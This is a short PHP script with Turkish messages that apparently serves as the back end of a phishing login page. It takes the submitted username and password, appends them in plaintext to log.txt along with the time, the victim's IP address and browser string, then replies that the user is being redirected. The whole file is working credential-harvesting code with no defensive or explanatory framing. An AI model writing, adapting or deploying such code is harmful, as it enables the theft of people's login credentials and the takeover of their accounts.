<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $logData = "Tarih: " . date("Y-m-d H:i:s") . ", Kullanıcı Adı: " . $username . ", Şifre: " . $password . ", IP Adresi: " . $_SERVER['REMOTE_ADDR'] . ", Tarayıcı: " . $_SERVER['HTTP_USER_AGENT'] . "\n";

    $file = fopen('log.txt', 'a');
    if ($file) {
        fwrite($file, $logData);
        fclose($file);
        echo json_encode(['status' => 'success', 'message' => 'Yönlendiriliyorsunuz...']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Veriler kaydedilemedi.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Geçersiz istek.']);
}
?>
